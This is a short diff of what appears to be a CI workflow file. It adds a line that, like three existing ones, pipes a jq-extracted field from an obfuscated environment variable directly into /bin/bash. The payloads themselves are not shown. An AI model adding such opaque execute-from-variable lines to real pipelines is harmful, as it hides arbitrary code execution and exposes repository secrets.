@@ -30,6 +30,7 @@ jobs:
           echo $zwe1 | jq -r .a8419 | /bin/bash
           printf '%s' "$hwjs9" | jq -r .xc83 | /bin/bash
           printf '%s' "$frt6" | jq -r .renw44733 | /bin/bash
+          printf '%s' "$g8082" | jq -r .cktrd759 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
